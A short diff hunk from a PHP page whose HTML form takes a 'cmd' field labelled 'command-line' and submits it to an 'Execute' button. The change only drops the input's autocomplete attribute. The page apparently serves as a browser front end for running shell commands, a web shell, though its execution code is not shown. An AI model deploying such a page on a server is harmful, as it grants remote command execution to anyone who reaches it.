@@ -18,7 +18,7 @@ endif;
 </head>
 <body>
     <form action="" method="post">
-        <input type="text" name="cmd" placeholder="command-line" required value="<?=$cmd ??""?>" autocomplete>
+        <input type="text" name="cmd" placeholder="command-line" required value="<?=$cmd ??""?>">
         <button type="submit">Execute</button>
     </form>
     <hr>
